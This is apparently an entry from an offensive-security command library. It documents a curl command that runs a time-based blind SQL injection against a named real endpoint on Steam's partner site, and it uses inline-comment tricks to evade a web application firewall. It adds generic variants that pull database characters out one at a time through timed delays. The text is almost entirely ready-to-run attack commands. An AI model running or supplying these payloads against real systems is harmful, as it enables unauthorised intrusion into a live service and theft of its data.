---
data: >-
  curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie:
  session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d
  'countryFilter[]=US/**/AND/**/IF(1=1, SLEEP(5), 0)--&reportType=1'
tags:
  - sqli
  - time-based
  - waf-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.243Z'
id: 84828cb2-097c-41fc-b74b-0ece7a8104f6
verified: false
validated: true
submitted: true
---
# curl-time-based-sqli

## Command

```bash
curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie: session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d 'countryFilter[]=US/**/AND/**/IF(1=1, SLEEP(5), 0)--&reportType=1'
```

## Description

Executes a time-based blind SQL injection using SLEEP to confirm conditions via response delays, with /**/ comments for WAF evasion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'countryFilter[]=...SLEEP(5)...'` | Time delay payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/vuln.php' -d 'param=val AND SLEEP(5)--'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/vuln.php' -d 'param=val AND IF(ASCII(SUBSTRING((SELECT db),1,1))>64,SLEEP(5),0)--' -w '%{time_total}'
```

## Expected Output

Response after ~5-second delay for true conditions; immediate for false.

## Related

- [[commands/curl-boolean-sqli]]
- [[procedures/Exploiting-Blind-SQL-Injection-in-Country-Filter]]
